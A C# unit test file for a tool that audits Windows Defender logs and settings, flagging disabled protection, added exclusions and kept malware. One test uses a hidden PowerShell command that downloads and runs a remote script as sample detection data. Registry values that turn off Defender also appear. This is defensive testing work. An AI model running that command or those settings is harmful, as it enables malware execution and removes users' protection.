using HistoryParser.Core.Bypass;
using HistoryParser.Core.Collectors;
using HistoryParser.Core.Models;
using Entry = HistoryParser.Core.Bypass.AntivirusAudit.Entry;

namespace HistoryParser.Core.Tests;

/// <summary>
/// The antivirus checks, fed events shaped like the real ones in Defender's log (field names and value formats were read
/// from this provider's definitions and from real events). What gets flagged is what someone did - switched protection
/// off, told Defender to skip something, kept a file it caught - never what a threat is called.
/// </summary>
public class AntivirusTests
{
    static readonly DateTime T0 = new(2026, 11, 5, 8, 0, 0, DateTimeKind.Utc);
    const string Key = @"HKLM\SOFTWARE\Microsoft\Windows Defender\";

    static Entry E(int id, double minutes, params (string Name, string Value)[] data) =>
        new(id, T0.AddMinutes(minutes), data.ToDictionary(d => d.Name, d => d.Value, StringComparer.OrdinalIgnoreCase));

    static Entry Found(string detection, double minutes, string path, string threatId = "2147925201", string threat = "Trojan:Win32/Pomal!rfn") =>
        E(1116, minutes, ("Detection ID", detection), ("Threat ID", threatId), ("Threat Name", threat), ("Severity Name", "Severe"),
            ("Category Name", "Trojan"), ("Path", path), ("Process Name", @"C:\Windows\explorer.exe"), ("Detection User", @"PC\player"), ("Source Name", "Real-Time Protection"));

    static Entry Acted(string detection, double minutes, string path, string action, string threatId = "2147925201") =>
        E(1117, minutes, ("Detection ID", detection), ("Threat ID", threatId), ("Threat Name", "Trojan:Win32/Pomal!rfn"), ("Path", path), ("Action Name", action));

    static List<DefenderDetection> Detections(bool onDisk, params Entry[] entries) => AntivirusAudit.DetectionsFrom(entries, null, _ => onDisk);

    [Theory]
    [InlineData(@"CoreService\WdConfigHash = 0x68B4CF58", @"CoreService\WdConfigHash = 0xDD5DE324")]
    [InlineData(@"SpyNet\LastMAPSFailureTimeString = 2026-11-10T00:01:45Z", @"SpyNet\LastMAPSFailureTimeString = 2026-11-14T20:01:48Z")]
    [InlineData(@"Features\TamperProtectionSource = 0x2", @"Features\TamperProtectionSource = 0x5")]
    [InlineData(@"Diagnostics\PlatformRollbackMethod = 0x0", @"Diagnostics\PlatformRollbackMethod = 0x3")]
    public void Defenders_own_bookkeeping_is_not_a_change(string oldValue, string newValue) =>
        Assert.Null(AntivirusAudit.Classify(Key + oldValue, Key + newValue));

    [Fact]
    public void An_added_exclusion_is_flagged_and_a_removed_one_is_listed_unflagged()
    {
        string value = Key + @"Exclusions\Paths\C:\Users\player\.gradle = 0x0";
        var added = AntivirusAudit.Classify("", value)!.Value;
        Assert.Equal("Exclusion added", added.Setting);
        Assert.True(added.Suspicious);
        Assert.Contains(@"C:\Users\player\.gradle (folder or file)", added.Detail);

        var removed = AntivirusAudit.Classify(value, "")!.Value;
        Assert.Equal("Exclusion removed", removed.Setting);
        Assert.False(removed.Suspicious);
    }

    [Theory]
    [InlineData("0x6", "Threat set to: Allow", true)]
    [InlineData("0x9", "Threat set to: No action", true)]
    [InlineData("0x2", "Threat set to: Quarantine", false)]
    public void Telling_Defender_to_leave_a_threat_alone_is_flagged(string code, string setting, bool flagged)
    {
        var change = AntivirusAudit.Classify("", Key + @"Threats\ThreatIDDefaultAction\2147925201 = " + code)!.Value;
        Assert.Equal(setting, change.Setting);
        Assert.Equal(flagged, change.Suspicious);
        // Taking the rule away again is the opposite of hiding something.
        Assert.False(AntivirusAudit.Classify(Key + @"Threats\ThreatIDDefaultAction\2147925201 = " + code, "")!.Value.Suspicious);
    }

    [Theory]
    [InlineData(@"Real-Time Protection\DisableRealtimeMonitoring = 0x1", "Real-time protection set to off", true)]
    [InlineData(@"Real-Time Protection\DisableRealtimeMonitoring = 0x0", "Real-time protection set to on", false)]
    [InlineData(@"REAL-TIME PROTECTION\DisableBehaviorMonitoring = 1", "Behaviour monitoring set to off", true)]
    [InlineData(@"Features\TamperProtection = 0x4", "Tamper protection turned off", true)]
    [InlineData(@"Features\TamperProtection = 0x5", "Tamper protection turned on", false)]
    [InlineData(@"SpyNet\SpyNetReporting = 0x0", "Cloud protection turned off", false)]
    public void A_protection_switch_in_the_registry_reads_as_what_it_does(string value, string setting, bool flagged)
    {
        var change = AntivirusAudit.Classify("", Key + value)!.Value;
        Assert.Equal(setting, change.Setting);
        Assert.Equal(flagged, change.Suspicious);
    }

    [Fact]
    public void Each_time_protection_went_off_is_paired_with_when_it_came_back()
    {
        var periods = AntivirusAudit.OffPeriods([E(5001, 0), E(5000, 304), E(5001, 400), E(5001, 401)]);
        Assert.Equal(2, periods.Count);
        Assert.Equal((T0, T0.AddMinutes(304)), (periods[0].Off, periods[0].On!.Value));
        Assert.Equal(T0.AddMinutes(400), periods[1].Off);
        Assert.Null(periods[1].On); // a second "off" while already off is the same period
    }

    [Fact]
    public void Protection_off_for_hours_is_flagged_and_so_is_half_a_minute()
    {
        var changes = AntivirusAudit.ChangesFrom([E(5001, 0), E(5000, 304), E(5001, 1000), E(5000, 1000.5)], T0.AddDays(1), realTimeNow: true);
        var hours = Assert.Single(changes, c => c.Row.TimeUtc == T0);
        Assert.Equal(Severity.Medium, hours.Severity);
        Assert.True(hours.Row.Suspicious);
        Assert.Contains("Off for", hours.Row.Detail);
        Assert.Equal(T0.AddMinutes(304), hours.Until);

        // Thirty seconds may be Defender restarting itself, and is also long enough to start a program: never left unmarked.
        // It starts as Low and becomes Medium when a program ran inside it (which needs the scan's history, so not here).
        var brief = Assert.Single(changes, c => c.Row.TimeUtc == T0.AddMinutes(1000));
        Assert.Equal(Severity.Low, brief.Severity);
        Assert.True(brief.Row.Suspicious);
        Assert.Equal(T0.AddMinutes(1000.5), brief.Until);
    }

    [Fact]
    public void Another_antivirus_only_counts_as_protection_when_it_is_installed_like_one()
    {
        string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        var vendor = new HistoryParser.Core.Analysis.SignatureFacts(SignatureStatus.Signed, "Some Vendor", HistoryParser.Core.Analysis.SignerRoot.Program, false);
        var selfMade = vendor with { Root = HistoryParser.Core.Analysis.SignerRoot.Local };
        var unsigned = new HistoryParser.Core.Analysis.SignatureFacts(SignatureStatus.Unsigned, null, HistoryParser.Core.Analysis.SignerRoot.None, false);

        Assert.True(AntivirusAudit.LooksInstalled(programFiles + @"\Some Vendor\av.exe", _ => true, _ => vendor));
        // The way tools that switch Defender off do it: a vendor's real, validly signed program, run from where it was unpacked.
        Assert.False(AntivirusAudit.LooksInstalled(@"C:\Users\player\Downloads\tool\wsc_proxy.exe", _ => true, _ => vendor));
        Assert.False(AntivirusAudit.LooksInstalled(programFiles + @"\Some Vendor\av.exe", _ => false, _ => vendor));   // registered, not there
        Assert.False(AntivirusAudit.LooksInstalled(programFiles + @"\Some Vendor\av.exe", _ => true, _ => unsigned));
        Assert.False(AntivirusAudit.LooksInstalled(programFiles + @"\Some Vendor\av.exe", _ => true, _ => selfMade));  // a certificate added to this PC
        Assert.False(AntivirusAudit.LooksInstalled("", _ => true, _ => vendor));

        // Registered and "on" is not protection unless it is installed.
        var posing = new AntivirusAudit.LiveStatus { Readable = true, RealTime = false, Others = [new AntivirusAudit.OtherProduct("Some AV", true, @"C:\Temp\x.exe", false)] };
        Assert.False(posing.OtherIsOn);
        var real = posing with { Others = [new AntivirusAudit.OtherProduct("Some AV", true, programFiles + @"\Some Vendor\av.exe", true)] };
        Assert.True(real.OtherIsOn);
    }

    [Fact]
    public void Off_with_no_record_of_coming_back_is_still_off_only_when_Windows_says_so_too()
    {
        Entry[] log = [E(5001, 0)];
        var stillOff = Assert.Single(AntivirusAudit.ChangesFrom(log, T0.AddHours(3), realTimeNow: false));
        Assert.Contains("still off", stillOff.Row.Detail);
        Assert.Equal(T0.AddHours(3), stillOff.Until);

        // The "on again" record can have rolled out of the log, or a third-party antivirus took over: the live state decides.
        var onNow = Assert.Single(AntivirusAudit.ChangesFrom(log, T0.AddHours(3), realTimeNow: true));
        Assert.Contains("does not say when it came back", onNow.Row.Detail);
    }

    [Fact]
    public void A_detection_and_what_was_done_about_it_are_one_row()
    {
        const string path = @"file:_C:\Users\player\Downloads\tool.exe";
        var d = Assert.Single(Detections(onDisk: false, Found("{A}", 0, path), Acted("{A}", 0.2, path, "Quarantine")));
        Assert.Equal("Trojan:Win32/Pomal!rfn", d.Threat);
        Assert.Equal(@"C:\Users\player\Downloads\tool.exe", d.Path);
        Assert.Equal("Quarantine", d.Action);
        Assert.Equal(@"PC\player", d.User);
        Assert.False(d.Kept);
    }

    [Fact]
    public void A_threat_allowed_right_after_it_was_caught_means_the_file_was_kept()
    {
        const string path = @"file:_C:\Users\player\Downloads\tool.exe";
        var allow = E(5007, 0.3, ("Old Value", ""), ("New Value", Key + @"Threats\ThreatIDDefaultAction\2147925201 = 0x6"));
        var kept = Assert.Single(Detections(onDisk: true, Found("{A}", 0, path), allow));
        Assert.True(kept.Kept);
        Assert.Equal("Allowed", kept.Action);
        Assert.Contains("Set to Allow at", kept.Note);

        // The same rule set nine days earlier answered another detection, and was removed since: this one was quarantined.
        var old = E(5007, -9 * 24 * 60, ("Old Value", ""), ("New Value", Key + @"Threats\ThreatIDDefaultAction\2147925201 = 0x6"));
        var later = Assert.Single(Detections(onDisk: false, Found("{B}", 0, path), Acted("{B}", 0.1, path, "Quarantine"), old));
        Assert.False(later.Kept);
        Assert.Equal("Quarantine", later.Action);
    }

    [Fact]
    public void A_file_taken_back_out_of_quarantine_was_kept()
    {
        const string path = @"file:_C:\Users\player\Downloads\tool.exe";
        var restore = E(1009, 5, ("Threat Name", "Trojan:Win32/Pomal!rfn"), ("Path", path), ("Domain", "PC"), ("User", "player"));
        var d = Assert.Single(Detections(onDisk: true, Found("{A}", 0, path), Acted("{A}", 0.1, path, "Quarantine"), restore));
        Assert.True(d.Kept);
        Assert.Equal("Restored from quarantine", d.Action);

        var change = Assert.Single(AntivirusAudit.ChangesFrom([restore], T0.AddDays(1), true));
        Assert.Equal(Severity.Medium, change.Severity);
        Assert.Contains(@"PC\player", change.FindingDetail);
    }

    [Fact]
    public void A_removed_file_that_is_on_disk_again_came_back()
    {
        const string path = @"file:_C:\Users\player\Downloads\tool.exe";
        var back = Assert.Single(Detections(onDisk: true, Found("{A}", 0, path), Acted("{A}", 0.1, path, "Remove")));
        Assert.True(back.Kept);
        Assert.Contains("came back", back.Note);
        // Caught and never acted on, still there: that is Defender's unfinished work, not someone's choice.
        Assert.False(Assert.Single(Detections(onDisk: true, Found("{B}", 0, path))).Kept);
    }

    [Fact]
    public void A_command_caught_as_it_ran_is_a_command_not_a_file()
    {
        const string raw = @"CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -Command $a = 1; Invoke-Expression (Invoke-RestMethod 'https://example.test/x.ps1')";
        Assert.Empty(DefenderDetectionCollector.DetectionPaths(raw));
        var d = Assert.Single(Detections(onDisk: false, Found("{A}", 0, raw, "2147944950", "Trojan:Win32/ClickFix.CCS!MTB")));
        Assert.Equal("", d.Path);
        Assert.StartsWith(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden", d.Command);
        Assert.EndsWith("x.ps1')", d.Command); // the semicolon inside the command did not cut it short
    }

    [Fact]
    public void A_download_names_its_file_and_where_it_came_from()
    {
        const string raw = @"webfile:_C:\Users\player\Downloads\a.exe|https://example.test/a.exe|pid:4242,ProcessStart:134000000000000000";
        Assert.Equal([@"C:\Users\player\Downloads\a.exe"], DefenderDetectionCollector.DetectionPaths(raw));
        Assert.Equal("https://example.test/a.exe", AntivirusAudit.Downloaded(raw));
        var archive = @"containerfile:_C:\Users\player\x.zip; file:_C:\Users\player\x.zip->rules/a.yml";
        Assert.Equal([@"C:\Users\player\x.zip"], DefenderDetectionCollector.DetectionPaths(archive));
        Assert.Null(AntivirusAudit.Downloaded(archive));
    }

    [Fact]
    public void Defenders_own_trimming_of_its_history_is_not_someone_clearing_it()
    {
        // Real shape: as SYSTEM, everything older than about two weeks.
        var own = E(1013, 0, ("Timestamp", T0.AddDays(-15).ToString("yyyy-MM-ddTHH:mm:ssZ")), ("Domain", "NT AUTHORITY"), ("User", "SYSTEM"));
        var routine = Assert.Single(AntivirusAudit.ChangesFrom([own], T0.AddDays(1), true));
        Assert.False(routine.Row.Suspicious);
        Assert.Null(routine.Severity);

        var recent = E(1013, 0, ("Timestamp", T0.AddMinutes(-1).ToString("yyyy-MM-ddTHH:mm:ssZ")), ("Domain", "NT AUTHORITY"), ("User", "SYSTEM"));
        Assert.True(Assert.Single(AntivirusAudit.ChangesFrom([recent], T0.AddDays(1), true)).Row.Suspicious);
        var byUser = E(1013, 0, ("Timestamp", T0.AddDays(-15).ToString("yyyy-MM-ddTHH:mm:ssZ")), ("Domain", "PC"), ("User", "player"));
        Assert.Equal(Severity.Low, Assert.Single(AntivirusAudit.ChangesFrom([byUser], T0.AddDays(1), true)).Severity);
    }

    [Fact]
    public void Tamper_protection_undoing_a_change_is_listed_and_a_non_change_is_not_flagged()
    {
        var real = E(5013, 0, ("Changed Type", "Reverted"), ("Value", Key + @"Features\SomeSetting = 1 -> 0"));
        var change = Assert.Single(AntivirusAudit.ChangesFrom([real], T0.AddDays(1), true));
        Assert.Equal("Tamper protection reverted a change", change.Row.Setting);
        Assert.Equal(Severity.Low, change.Severity);

        var nothing = E(5013, 0, ("Changed Type", "Reverted"), ("Value", Key + @"REAL-TIME PROTECTION\DisableRealtimeMonitoring = 0 -> 0"));
        Assert.False(Assert.Single(AntivirusAudit.ChangesFrom([nothing], T0.AddDays(1), true)).Row.Suspicious);
        // The same about real-time protection has no finding of its own: the time it was off is the finding.
        var realTime = E(5013, 0, ("Changed Type", "Reverted"), ("Value", Key + @"REAL-TIME PROTECTION\DisableRealtimeMonitoring = 1 -> 0"));
        var listed = Assert.Single(AntivirusAudit.ChangesFrom([realTime], T0.AddDays(1), true));
        Assert.True(listed.Row.Suspicious);
        Assert.Null(listed.Severity);
    }

    [Fact]
    public void An_exclusion_gives_cover_where_a_user_can_write_or_for_code_and_not_in_a_programs_own_folder()
    {
        string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        Assert.NotNull(AntivirusAudit.ExclusionRisk(@"C:\Users\player\Desktop\vc-mod (folder or file)"));
        Assert.NotNull(AntivirusAudit.ExclusionRisk(@"C:\ (folder or file)"));
        Assert.NotNull(AntivirusAudit.ExclusionRisk(@"D:\Games\* (folder or file)"));
        Assert.NotNull(AntivirusAudit.ExclusionRisk(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\Temp (folder or file)"));
        Assert.NotNull(AntivirusAudit.ExclusionRisk("javaw.exe (process)"));
        Assert.NotNull(AntivirusAudit.ExclusionRisk(".jar (file type)"));
        Assert.Null(AntivirusAudit.ExclusionRisk(".log (file type)"));
        Assert.Null(AntivirusAudit.ExclusionRisk(programFiles + @"\Some Antivirus (folder or file)"));
    }

    [Theory]
    [InlineData(397568, true)]  // 0x061100: Defender, on (read from this PC)
    [InlineData(393472, false)] // 0x060100: off
    [InlineData(266240, true)]  // 0x041000: another product, on
    [InlineData(262144, false)] // 0x040000: off
    public void Security_Centers_number_says_whether_a_product_is_on(int state, bool on) => Assert.Equal(on, AntivirusAudit.ProductIsOn(state));

    [Fact]
    public void A_WMI_time_is_local_time_and_minutes_from_UTC()
    {
        Assert.Equal(new DateTime(2026, 11, 14, 13, 0, 4, DateTimeKind.Utc), AntivirusAudit.CimTime("20261114050004.000000-480"));
        Assert.Equal(new DateTime(2026, 11, 14, 5, 0, 4, DateTimeKind.Utc), AntivirusAudit.CimTime("20261114050004.000000+000"));
        Assert.Null(AntivirusAudit.CimTime("11/14/2026 5:00:04 AM"));
        Assert.Null(AntivirusAudit.CimTime(null));
    }

    [Fact, Trait("Category", "Integration")]
    public void The_live_state_of_this_PCs_antivirus_can_be_read()
    {
        // A build server's image decides whether Defender answers there; this is a check of a real PC.
        if (Environment.GetEnvironmentVariable("CI") == "true") return;
        var live = AntivirusAudit.LiveStatus.Read();
        // Every Windows 10/11 PC has Defender's WMI provider or another antivirus registered; one of them must answer.
        Assert.True(live.Readable || live.Others.Count > 0);
        if (live.Readable) Assert.NotNull(live.RealTime);
    }
}
